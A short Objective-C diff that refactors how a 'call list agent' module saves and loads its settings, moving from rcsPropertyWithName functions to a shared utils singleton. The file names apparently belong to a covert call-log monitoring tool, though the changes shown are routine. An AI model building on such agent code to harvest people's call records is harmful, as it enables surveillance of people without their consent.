@@ -11,6 +11,7 @@
 
 #import "RCSILogManager.h"
 #import "RCSIAgentCallList.h"
+#import "RCSIUtils.h"
 
 //#define DEBUG
 
@@ -272,7 +273,9 @@ typedef struct _callListAdditionalHeader {
     [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: dict, nil]
                                   forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
   
-  setRcsPropertyWithName([[self class] description], agentDict);
+  //setRcsPropertyWithName([[self class] description], agentDict);
+  [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
+                                  withDictionary:agentDict];
   
   [agentDict release];
   [dict release];
@@ -284,7 +287,9 @@ typedef struct _callListAdditionalHeader {
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  NSDictionary *agentDict = rcsPropertyWithName([[self class] description]);
+  NSDictionary *agentDict; // = rcsPropertyWithName([[self class] description]);
+  
+  agentDict = [[_i_Utils sharedInstance] getPropertyWithName:[[self class] description]];
   
   if (agentDict == nil) 
     {
